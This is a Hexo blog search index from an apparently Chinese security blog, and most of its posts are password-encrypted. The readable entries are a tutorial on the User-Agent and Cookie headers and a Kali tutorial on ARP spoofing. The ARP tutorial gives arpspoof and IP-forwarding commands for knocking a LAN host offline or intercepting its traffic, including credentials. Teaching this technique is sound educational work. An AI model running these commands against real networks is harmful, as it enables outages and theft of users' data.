<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2019年终总结</title>
    <url>/post/2019year-endsummary/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="f7c8ef3170b771bf106a0bea12dd40022453b9c61152a65dd5d6fae95095afaf">65b591f270a691a8bcf50a13db064a05e0f17753fdf8ab5c0d6289902398cafcd3e3f442ae9db0c24c5c481c923c335a776216a5103d339f1004d3bcd4eeec9f19cd1f8ab782bd63109e7b9bdd19a16cd1b4a70515a98962d46b027b0fe5328e7ca863c17da44d682f88eee95ae663d20eee6464426ff4c816b2aecc282e7e7b3419e3779fb621920c41c1f08526f1cfcc380666fac2eddc31e33e50ba1e3fdb9d284c48078d0fcd2457fedb7182b0486d69d273d1f2965f95418267b81ec4b0903353b44bd30439de7087a6ff21d2ecc65f3c893b68473141459bf5e3c74bcbb3c6bd4f3a16fc96fdd4c5b53a9042e08f3c88b2d0fdfa2ce86069e4700bbb5734f037541f47d15266c3ec09a442222a9d5090f89c9b0e9d3374b595f4c4632f5eafb0d322b347f20958eab9901746cd8518746bde6fbb658435b04dacd569210f22a54a513cc88e682aec80ae616d75ead53802889ed4276712b5d1962521362255ffc5796f7a267463507742abe4b602fc4132ce6bd44b6a176addab115ad9c3179945756409cef2f6c0a8d4a039ff3fe430b03b46cf80ba3f4db4a5f17a000713cf557a476dcaf8cc57ad7c2e252fc71f7b60307738c27db60c013cdb99ca745c9ca51408761e6aaf74a3b4a8b2c91f8afc98ef93886b8e3626902d1d5967f72df5f9b1734fcda59984f054a15c6e2f92e85601c45de893a4346dc3a10b040dedfd4808aa17d5f433633334426d49f91723ebe95aff93625ad0b8d9d583b80fc97e44b53dc82b77c8cb05ea8bff59c8a2c52b7e96af7a51f768debf20de9558784fc5829c093572aca78a5720100cee581d84b96e334e84a974bc636ed35e664f092db15256ac65c042f35654b40318d4792b959b40965058e386f388c56919a2c9536a706a64efb010a5993f86affa021c352fa270e97a883cbb44aa6159ba909b29bca64b82c6368a6dcdadf9297e87f26fe7f3c405a6b1b87f71e8cce7e1ad69a5289bead1dc67c40ef67cf8f2d4fad8e060a1aeb00cfc6d2668df92c79cc1c8fec12eb25cec088d8352189e2e3df03edf38a7c327bb70a737a874173f65d06316ff1836c2e1bfb4fa60e6fc4e718a96adf242042edf5f9f99359fecaf3e530789c08e2f7b680bc4011093cc3c7cc564950b01021f26aae14e81449fa206b3a9cda6c9531f8b8a07d694c196d8f0a7aea5dc9f8df27afb7d583635cabc4803fdb827699dae8a205dfb2a79d629893690ff4f158d37bb7db7b0cd80776bb7e1a331a1c4e5151a02d3390aa5ebd5a845d33820fbf2eb09dc6f0d8fd87033a2293af90da168fb8e24230e41c97cd3d094100496b1bcbe253a17df4d560010542e6d4b00fea7f343da7acc03bade02d8baa56f440eb61b08b6bdd74b6134dbd91ff4e424d3d0689486aba53107d90d959aba9c4a20d9dee242f8b2ec016e797faf093250c0e700d3a3fbc5d10bdf0d4188afcafa975d2377573e89cb4a7c581ebcd1ff93b70bed739318a36a13360ae13b4293bb8aca89ee565b655440dc2e2bbc8ed49f495aed7703c475f43c819e43286a4f6ed79b4fc8bd9663d422d2a6d22e686f80c5e3c5473c99ee0f3ed9314de192ce07040be73d902b0b4da48a92a9876fd89a975b24f4ddc2bcf4c2a0771def52c19763c7ab82ef30863523639b17d2f71e07dbce29c3b87eacfb4342c1a069ff414bf5c6118bd8688aaa6462d1202c49a8ae13aa2cd229a57ea4e7950da4b8fc93c8e7424bb7e128ae258193fedd2fff14bf78f5ac634b1ac57d44c03e98b7005a7c2c2fb12692f6e06166c9f9b21ca3c114c375f78afd980e77d22e893972171b268e42a0ce86b6b181049d7bff52317da1610b834848d226035c38512970a45e58294eacf26913b599fcacc59bcab30dd52523caf16bb882710512f43aa1b9c02573def1ebbf4e48687cb62f792b7e875d40a3e9ec9c34c46f37196f5732bee82b648356a9644686eac0f92e78c5217e10e412a04ef1e85f0e4038e35dec19c2c2d9d6ff472a14ce4d2b9c787d2fa55a76ecf6b1173bb2cc11c2a0024cb3dcc57ddad17804c63a785f80d8938a9a6a875c2ce42db0aaea78878ecf43793776c7b7d39d67e7b7cb5de5523b686e83cef10a910d53812fef64fb03b3281427d642fbcafd94ccb05bfc12628fb13cebc89774b3a18ebddf3daadc0b9ed11092587c258555cd242b5f5372df1f7f4f93e5cf21928eac39671b06b361196677ab618f0c1b4424a152551aed56be96a867cffff5de99233fc09d2b6135eb81703684c68a6d3fc75d8bb14392c849beeb46136bdd3d398003ebab4694c897677e842396439e8d409d140bfcae032f44f6c1f0d87d6efae2df6c7cfebe9eaf47343000571b52fcb697712643c1ec28a961c79fa7d775c35c24e32609fc19b0c080b81f829e2a6fb80e4a070074f7d0ffe011ab7f9c21a55d3e425c409f2a8ec0a4e0c92f7d747b8e1f3358cd3a11e1143db02ac784061d88b75c6696714f39b17c38c1a28f148c47bc866652822e8b290039a5638c8719b48df86a66d5c0e9c7374d346148dfd97a23b9804c88db0533e5f10f0e181d1fd5bf00bc868a1549ed00fc7228293625a17c9a140d9c6433e79a4d14c52639bd93270f98f0e696592d7c2bd9adf41ca9c592da33862beabc524731c9f4711f492c7f66628cc9ec1ece072dd8cdb8d9d32873183aca39850491b7465ab5ee935f1ce5654cd49a370c660b7d0288013e45c158efa08f0188142793e18dec2f165c13e000de58a78853a7</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>总结</category>
      </categories>
      <tags>
        <tag>总结</tag>
      </tags>
  </entry>
  <entry>
    <title>内网称霸之《ARP欺骗断网攻击》</title>
    <url>/post/ARP-Broken-network/</url>
    <content><![CDATA[<p>⭐<strong>使用工具：arpspoof</strong><br><font face="楷体"><strong>什么是ARP?</strong></font></p>
<blockquote>
<blockquote>
<p>&amp;emsp; ARP（Address Resolution Protocol，地址解析协议）是一个位于TCP&#x2F;IP协议栈中的 低层协议，负责将某个IP地址解析成对应的MAC地址。<br><font face="楷体"><strong>什么是ARP欺骗?</strong></font><br>&amp;emsp;从影响网络连接通畅的方式来看，ARP欺骗分为两种，一种是对路由器ARP表的欺骗；另一种是对内网PC的网关欺骗。<br>&amp;emsp;第一种ARP欺骗的原理是——截获网关数据。它通知路由器一系列错误的内网MAC地址，并按照一定的频率不断进行，使真实的地址信息无法通过更新保存在路由器中，结果路由器的所有数据只能发送给错误的MAC地址，造成正常PC无法收到信息。第二种ARP欺骗的原理是——伪造网关。它的原理是建立假网关，让被它欺骗的PC向假网关发数据，而不是通过正常的路由器途径上网。在PC看来，就是上不了网了，“网络掉线了”。<br>&amp;emsp;实际上ARP欺骗是一种中间人攻击，攻击者通过毒化受害者的ARP缓存，将网关的MAC替换成攻击者的MAC，于是攻击者的主机实际上就充当了受害主机的网关，之后攻击者就可以截获受害者发出和接到的数据包，从中获取账号密码、银行卡信息等。</p>
</blockquote>
</blockquote>
<hr>
<hr>
<p><font face="楷体">特别提示：<br>1、arpspoof是“Dsniff网络嗅探工具包“其中的一个工具；<br>2、使用arpspoof前内核“IP转发”功能（或完成相同的功能程序，例如fragrouter）必须提前打开。</font><br>&amp;nbsp;</p>
<h3 id="一、ARP断网攻击用法"><a href="#一、ARP断网攻击用法" class="headerlink" title="一、ARP断网攻击用法"></a>一、ARP断网攻击用法</h3><table><tr><td bgcolor=#D1EEEE>1.先ping目标主机，ping通的主机才能欺骗；
2.若是不知目标主机IP，那就先查看本机IP，比如本机是192.168.1.201；
3.可以用fping -asg 192.168.1.0/24查看局域网内所有存活的主机IP，推荐查看IP列表中存  活的IP，因为有的IP不能直接给出是存活的；
4.使用模板：arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host
即：arpspoof -i eth0 -t 192.168.1.201 192.168.1.1
5.如此就能使目标主机在ARP欺骗期间处于断网状态。</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br><span class="line">fping -asg 192.168.1.0/24</span><br><span class="line">ping 192.168.1.201</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.201 192.168.1.1</span><br></pre></td></tr></table></figure>

<blockquote>
<blockquote>
<p>提示：<br>-i interface          指定要使用的接口。<br>-c own|host|both      指定范围own|host|both（自己|主机|两者）。<br>-t target             指定一台特定主机为ARP中毒（如果未指定，则为LAN上的所有主机）。<br>-r<br>host                  指定您希望拦截数据包的主机（通常是本地网关）。</p>
</blockquote>
</blockquote>
<p>&amp;nbsp;</p>
<h3 id="二、开启流量转发"><a href="#二、开启流量转发" class="headerlink" title="二、开启流量转发"></a>二、开启流量转发</h3><p>使目标的IP流量经过我的网卡，进行IP流量转发，让目标主机正常上网：</p>
<table><tr><td bgcolor=#D1EEEE>1.ARP欺骗之前先开启流量转发，使用echo 1 > /proc/sys/net/ipv4/ip_forward
2.使用命令：cat /proc/sys/net/ipv4/ip_forward,显示1表示成功开启转发功能，0表示未
开启;
3.另开一个窗口：arpspoof -i eth0 -t 192.168.1.201 192.168.1.1进行欺骗；
4.若目标主机能正常上网，则流量转发成功，否则流量转发未成功；
5.本机（虚拟机）就被靶机当成网关了（即实际网关和攻击主机的物理地址一样）
</td></tr></table>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> 1 &gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line">arpspoof -i eth0 -t 192.168.1.201 192.168.1.1</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>Kali-内网称霸</category>
      </categories>
      <tags>
        <tag>ARP欺骗</tag>
      </tags>
  </entry>
  <entry>
    <title>对称密码-分组密码</title>
    <url>/post/Block-Cipher/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="1556ef135cab0d53294a4652ecaeb899e9cc543686e11bb37aa3f1655567ab38">f2cb6dad3997b265c98f36a97452129cc092e92f124168e062928c4d9cb8fadca46648e736fc1bc951b9b43d510bf6863bad8153b565e4b7b9e9d750ec263e6169692dd465dd02789a5d5f6b40a052a6762006d5903d54247fd4f90b5c300dba82c9c8474d0c1ee774ba407ecebc89dbd07f6e965f0cf3917fe1622ad8e1c18537dc9ebd5532871c177c25d94f7910c94344103f8b49b6844aa25690bdd6952270b7518e408c7f29ef7436eab3c0741dac8185f96c0abf2488fe1300a8878741c162014235065290f6c16b6fa7579a81ba224e0005fb175d0b9944eb0b65301bc3da43b6c6c050f27a8fe661f7641b65344b1b99d14c64c427c3b65a2b548d7324b8760adfcf80f620a0069bb3cf579fc95c89eff32c8601b4e70f2d2d5a8ef4b5aa521c518f999612471f30863978baa2a3ccaf40dea280a4bf3be6bda6f1c70d2d35c90fcb2c4ef28562debe23cba7d3be8123151d03d14dafa4c8f2abf2961d5f1f6030b960fd34f5837f555e44aa9846fed1384e2011d1a7b5334d2d9e6bf97b37a290b734a7766d6eeb3649d6bbf26b018a093d28b8dfea1f97a56a2ed8c39287ffd3c2c87e23a56beb36c219f921424fadd59d179aef2e031f63a8efedaa18e36bf26b62cf6baf9bcc2ee58ca244768a12294cae4f84429fc952fc4f525fdd84f72f024cb18eb67450896adc3d9c985e4e817dec7e1c87db7d1ab106d1b4ef3b5c60b37c5d4d6ef21020b53a439e5e44db795c47b66591124d53e2ee0f1c6c2a8e6a077343544e314b7e6475c607c845ff8ff7173034068d7de4ba698ae46d3f820bb441d384d84f833d40620691942a6789791e076d3b5f677785becdca320c8d75c3071d0dfdcbb2528dc7d668ff085ae2e85079ee70bc31ab45c8c0ac12316c6048ef3c3b8e2d12960580305a8f6d090588da829c4559aa9c3c1ff409a1d0913fea285581bfd79db08bfb1d2ba21acfaa4c6e2a3edb3924e2ac938c2f568bdde0b0cadef7b5db15a20ce41f46dee8dc94a8be58717c18aef7cfcdfec9d6d7655b75ab1721fc1ea811c1e8b3fcea887d1da9075f10302b51dd193cb66b8f5d3516404dfdf12207426efdea825daea1960707dd0cae80b6b17ab4cd1e6970cb5ae481d3f831666699c4878a6b8bf72d3dd9e47dcf10ae58dce10e2a308bff6d4ed47b3ec8b280157c3c5bf85ad776e565259d6edcab38f70af24736ee95b814a43be3970822628bb4902199964b9114a0e0422c6694ed3512c37e8abdefdecc70b47d3ffb30f99754750e65e99743e244544566770545c228a7fdbedd7d51453ae538b9e187853d58e507ab78d9125f2f77c5a41e6ed98babbd39efa277c6bad74ec8614b8ffe9fe3e3413c952cfc300f29e20002f970785ab68d405614a0d9d0e605a4445f9c9ec48062402f80ef9f786a38fcde5335b9a810b93513a3c0a9aa67bc3768ecc216c93264afc7deee77a18148ee1f7992c38bde0d0851de875637f8656b33473db160438c2717f48cfe89c69abe1f72f549ec46fac16c4fd49e685b5773f276b9599b4e7e99644f6b598b759b16aa66e5f1032af11a6b5acbe00adba986d6df38f81d700d61dd71df7dbb6f8e335bc20c06c11bb3a939ec5e9fd6deb2f1221b10eaf58d1fe58f31cd09e0f299ad43697e707a63916a75f1b4a1f3f55fcf61b6401e730a2fc4dcf5ce1a05941b80893647309eeb75c34baa4438e476db0197015a5929d25b311d2cf9f1be8d8547ff12f174348b521adf67c4f54a8ad32046eeb783d6f4938f85c54c902c7afe73504cb799e4f05fa643f36aede07cd5f8bf05636103c6a944c822573d0a08aa46816124c69f7e6476d9b6c7862792f97545788bf9b4ae11cbadca0cce001146c0cb60fb6bd2f15c48ea3798b6701eeef3bfb8a7d14523899b4a2826bbdc6a6539c3d1debbe1de720e1c4ddac8fdde6d8db81283a9786cc4c5f313af590b0ee107c18b057b4dbc492c4200b63c49b6f45349626153fdd464d39e00b249141725ece75f7eb758f0f775dee8c00eecb928decf4d8e3e10c485ce723f04eb3deb0c236221e2b5a23fcf1922e6ea93a9c7fd754488a1836491e8b80a24d1b482d5e121e08a20fc06572451ad478cf0f6364ebf2240ad0814a9c2f58f2651cd4d97353c90b934753c24ec92ab55d33c1a7ddc5e3e45b5511c46346063904b01cb9f72d68a8251a15e8bb982ec24d3e43cace041b5954e0184576934c226f275eab89ed3e06eec4dd33a6752aa0eb74af04d57b37471fe93d5887463be45fbb698d8b8d99ca3cd54349f032bf212162ec3334e311639bd7eee2c9442a902a8e3418131e642da3044cb7e1cc14a0b1ebbc4f7879ae214c3a54494a660ea66d0ef80b2c335ee1c300ff717ea548aed5615c45585857730edf146ba8f07f943fffe0e6bde87f0d056dae697b9f110333cc06025353ac5e9fa7f3cd2c10eeb35e1469079d6a013a736fe1ef79481cdaf81c7c3ef9a9ee7cb75e1c034651d8c8367934690afd169a2a1c5067e2ab89339db330eeefa0f15e41f997997f43127c84f95b9f551a8431b7eb00b0eb9df2ba96bb1b50b0c9f72e137da13ab982cb3ccd8bb445249523b6c3ad96d20c84aab9da75191afc45918b99a92bcb941be9047377ba4572fb86a3dbf8cfecd15ac25c3b8497dc737c23650969008d1fbd8900e7571f858a80c9755d627ba758a2d6ead6b2107bba222d7a11cfb27e7f74e7b12c7e51ebfb160de560825280c8467cc4f94cd8eeb4b15d417ba058e6ac4c8d03f75423753c62a5b5bc3d765869b027ad1e0a396d2662d2031e306ece3cdcae416303295e62fa105b474f2fced4bd7d1dbb1f7187d62be1648e4d0a4cb6ba64256b4e0fc184600c9fe32b4c31032dcbbd10b08dc8ad880418b996de1627c4107f2d04d25d17fffb0557dedafd5a7fc77a914a16f13aae61c1da99de58207ba98ec57534ffdc7a37cdd73b5f13f6babe7fe4b979ddc6d02126dc9d2616646f8e4ed3569a8e551618b7786fa6178addf29236c062f3f3bc75ecab543bdd56105ee5d2ba368379f25a36cd0df7d1167151528103f689e1fa77776dcdefdd58c27664fc81842b9eace32d2d2c083a6308461fc27e7ed134fb39d5dca576a8cb0670a906519c03a4ec611d6b3a0a37e60625e3f2ffa6b8d7d4a7bd99dc79b1c71e7378de6e894f7d4279d0c4be62fb24ba59eb07c7197897a2026a5327b99ca24d92874e645ab478d1190096e04e68beb8a1786fb3377e36d2c01f425b37e02607a044134d4a19c7ef23ab2046ce37ad62d8f000c5787230b24a29e471c48c91c08bef99c3d1ab18da9685da61a9b80f8fdd42d0c5d6d9dc132fb6390085fdabf0202aa867c9a3d4fef79c113f7c444b253ad0561cf2c295f89d95666520255d0a917e51f06990540a664fb95bdf9478f62910cb55d0efbf231075527f06add1e9146808b895df0a13d608671f51bd94549ae6260318b5aa7f5c882819d1c9a07301403d31e381095d651f851f4ac89419ddd464ab90f1ed1918a4c0bf8e047306de028b349450680a513d410316b33ec209e4f6f76715dd3a8931922cb915d772ad7aab9e73e9079007cf268f5ddc862ed389c876d1a92519b45daade497348962d506dbdc6011e0ef4e4db90287c4ca2b78b2c57363525bbdf13d7565f7f8ee99e2e1cf7066cc8d0795b442e96f80bf4a577e52561a846275ca227ebf028f091de37ca916b6a754aa3719ad4a6239a7d6e3aa077ca63c466737d7af27dc14329b51296df849236b34eaaac7449c32d763da03adaeff70a1e40891e578cdd26e20f5a31fd684deb754809d7f6a4dc82ffafe6eb3dad9a44260d3d828eba4a790f35dbb46626be338352d1b9df86ae64c21dffd5a0bfbbe9349e5b5c04a9026ceb197a363c931a21afdaacd91bd3bdc3ad61cc5b735452ea63af5680ec276cc142123ec7c1680a00e5e040cde60072f4a9b3c08699a5dd214ca39a0ca203a2c884bf69761556dff155b3a3cfd4472d0b0d40beb118142893019cb59f8ea982398d373480bc14200880c1f933adb9c5a9483dbc8e46763fc691aedc6abe4ee5eb46d3060f2482843286a0dc90477d16780903d2848097973846d6582b09d5bd8a804d71b8ee7e30a3ea5b14741a9d13c6caa833a42f75f38d239fa2b97408e851ed13f12cb6f005cd979cf4f6e4256e54e7e1a7bd4d1a9c2f7316b726551b9a52b68b8569c24c2a0886c06b0e6ce55826dd5858a43e3d05889e8b86c1d7d9db92c9d1e8e9cd524531b2a89b1892b707f720cacb5020629500e269736831f6f9d3b1d7b3a1bb36b67b2df7e1e4b126a1bf856adcaa76983aaccb6e222781343629f0e057f1a6ba22e27efadc204aa75c71b2447e9ea0c575405dc709eb29af5a40762d8d1afc5c4f598eb7c52858c963d85379ddffde0b0c0a85644f8b7f4b7ba5bb8515c3cd114785cb871b7b9ff9b407a7a328a98fc8eaee52774f7f502e52e9c30ebdd4942b131b981bc471c3c19cbaa4cf59edaaf682a77759e31506b1d0bb0d11b86bb398d9779d14c79cbb3b4eb52556a0d41ed168197f3ac24ece1ad0669630b1f3c75b6a073626e8b135bfc61fc6d3447064dd53bff00b6dce760c0818b9e80e17fa658c04f326187028395d53f5ca8435b652d1f2643910544db95bf8dc0a0fd2af0307a76d18235df06d2a06d5d6c</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>分组密码</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-Basic-knowledge</title>
    <url>/post/CTF-Basic-knowledge/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="206176acefaddb3071a5d44c4bfafc66a6b61ce73c270e3e04b973e0e769af0c"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SMB-Information-leakage</title>
    <url>/post/CTF-SMB-Information-leakage/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="43e80fe97520afbc873e21a302babf4b7311abb906117c1a6d0e9dc4230d399b"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SMB</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSH私钥泄漏</title>
    <url>/post/CTF-SSH-private-key-leak/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="c264606b57b0436c0502502c60bdd8ce676ce24ff280adbbd5d1ed3539e5eb04"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>CTF-SSH服务渗透测试</title>
    <url>/post/CTF-SSH-service-penetration/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="955b35f8c9829d21266ad22e75a89be881d808b8ff6e2052e6e0bb20360b771e"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Welcome to my blog, enter password to read.</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>SSH</tag>
      </tags>
  </entry>
  <entry>
    <title>《HTTP协议请求头部的User-Agen和Cookie》</title>
    <url>/post/HTTP-User-Agen-Cookie/</url>
    <content><![CDATA[<p>&amp;ensp;</p>
<h4 id="一、User-Agen"><a href="#一、User-Agen" class="headerlink" title="一、User-Agen"></a><font color="red" >一、User-Agen</font></h4><p><strong>注意在HTTP头部参数的首字母大写格式！</strong></p>
<h5 id="🌸1-1-什么是User-Agen"><a href="#🌸1-1-什么是User-Agen" class="headerlink" title="🌸1.1 什么是User-Agen"></a>🌸<font color="red" face="楷体">1.1 什么是User-Agen</font></h5><table><tr><td bgcolor=#EDEDED><font face="楷体"><font color="#008B45">**1.1.1**、</font> Http Header之User-Agen的User-Agen中文名为用户代理，是Http协议中的一部分，属于头域的组成部分，User Agent也简称UA。它是一个特殊字符串头，是一种向访问网站提供你所使用的浏览器类型及版本、操作系统及版本、浏览器内核、等信息的标识。通过这个标识，用户所访问的网站可以显示不同的排版从而为用户提供更好的体验或者进行信息统计；例如用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。UA可以进行伪装。<font color="red">浏览器的UA字串的标准格式：浏览器标识 (操作系统标识; 加密等级标识; 浏览器语言)渲染引擎标识版本信息</font>。但各个浏览器有所不同。</font></td></tr></table><table><tr><td bgcolor=#EDEDED><font face="楷体"><font color="#008B45">**1.1.2**、</font>用较为普通的一点来说，是一种向访问网站提供你所使用的浏览器类型、操作系统及版本、CPU 类型、浏览器渲染引擎、浏览器语言、浏览器插件等信息的标识。UA字符串在每次浏览器 HTTP 请求时发送到服务器！User-Agen也是用户识别的重要部分，通过分析，能知道用户使用的是什么设备、什么浏览器、什么应用等，进而可以分析其购买力、属性、职业等。</font></td></tr></table>


<p>&amp;ensp;</p>
<h5 id="🌸1-2-对UA字串的说明"><a href="#🌸1-2-对UA字串的说明" class="headerlink" title="🌸1.2 对UA字串的说明"></a><font color="red" face="楷体">🌸1.2 对UA字串的说明</font></h5><p><font face="楷体"><font color="#008B45"><strong>1.2.1</strong> </font><br><font face="仿体">&amp;emsp;出于兼容及推广等目的，很多浏览器的标识相同，因此浏览器标识并不能说明浏览器的真实版本，真实版本信息在 UA 字串尾部可以找到。</font></font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.2</strong> <strong>操作系统标识</strong></font><br><img data-src="https://s1.ax1x.com/2018/12/18/FBlnde.jpg" alt="FBlnde.jpg"></font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.3</strong> <strong>加密等级标识</strong></font><br>&amp;emsp;N: 表示无安全加密<br>&amp;emsp;I: 表示弱安全加密<br>&amp;emsp;U: 表示强安全加密</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.4</strong> <strong>浏览器语言</strong></font><br>&amp;emsp;在首选项 &gt; 常规 &gt; 语言中指定的语言</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.5</strong> <strong>渲染引擎</strong></font><br>&amp;emsp;显示浏览器使用的主流渲染引擎有：Gecko、WebKit、KHTML、Presto、Trident、Tasman等，格式为：渲染引擎&#x2F;版本信息</font></p>
<hr>
<hr>
<p><font face="仿体"><font color="#008B45"><strong>1.2.6</strong> <strong>版本信息</strong></font><br>&amp;emsp;显示浏览器的真实版本信息，格式为：浏览器&#x2F;版本信息<br>注：<br>1、在广告定向设定中，浏览器定向和操作系统定向均是针对User-Agent中的信息进行定向。<br>2、欲了解更多的User-Agent信息，请参考User-Agen 字串史</font></p>
<hr>
<hr>
<p>&amp;ensp;</p>
<h5 id="🌸1-3-User-Agen的作用"><a href="#🌸1-3-User-Agen的作用" class="headerlink" title="🌸1.3 User-Agen的作用"></a><font color="red" >🌸1.3 User-Agen的作用</font></h5><table><tr><td bgcolor=#EDEDED><font face="楷体">通过user-agent不能完全准确的判断是属于那款浏览器。由于UA字符串在每次浏览器HTTP 请求时发送到服务器，所以服务器就可以根据它来做好多事。
比如：
1、统计用户浏览器使用情况。有些浏览器说被多少人使用了，实际上就可以通过判断每个IP的UA来确定这个IP是用什么浏览器访问的，以得到使用量的数据。
2、根据用户使用浏览器的不同，显示不同的排版从而为用户提供更好的体验。有些网站会根据这个来调整打开网站的类型,如是手机的就打开wap，显示非手机的就打开pc常规页面。用手机访问谷歌和电脑访问是不一样的，这些是谷歌根据访问者的UA来判断的。 
既然知道了UA的作用，那么其实客户端也可以使用UA来做一些神奇的事。
比如：伪装 User-Agen 来回避某些侦测特定浏览器才能读取的网站。
如果使用Firefox浏览器插件User-Agen switcher，用户就可以轻松地在不同UA之间切换，把自己伪装成其他浏览器。这样就可以在PC上预览WAP或移动格式的网页，比如专门为iPhone设计的页面。</font></td></tr></table>

<p>&amp;ensp;</p>
<h4 id="二、Cookie——用户追踪之基础技术"><a href="#二、Cookie——用户追踪之基础技术" class="headerlink" title="二、Cookie——用户追踪之基础技术"></a><font color="red" >二、Cookie——用户追踪之基础技术</font></h4><h5 id="2-1-关于Cookie"><a href="#2-1-关于Cookie" class="headerlink" title="2.1 关于Cookie"></a><font color="red" face="楷体">2.1 关于Cookie</font></h5><h6 id="2-1-1-前言"><a href="#2-1-1-前言" class="headerlink" title="2.1.1 前言 "></a><font color="#008B45" face="楷体"><strong>2.1.1 前言</strong> </font></h6><p><font face="仿体">&amp;emsp;Cookie是如此的重要，以至于我们后面要讲到的回头客定向、访客频次定向、用户定向等等都需要基于此技术才可以实现，并且我们日常工作中所能见到的第三方监测工具如doubleclick、99click、秒针等也都要利用cookie技术，网站分析工具如GA、百度统计、CNZZ等也需要利用Cookie。如果没有Cookie，互联网广告市场将受到巨大打击，尤其对于目前我们谈论的精准广告而言。如果没有Cookie，网站分析也不从做起，遑论优化了。<br></font></p>
<hr>
<hr>
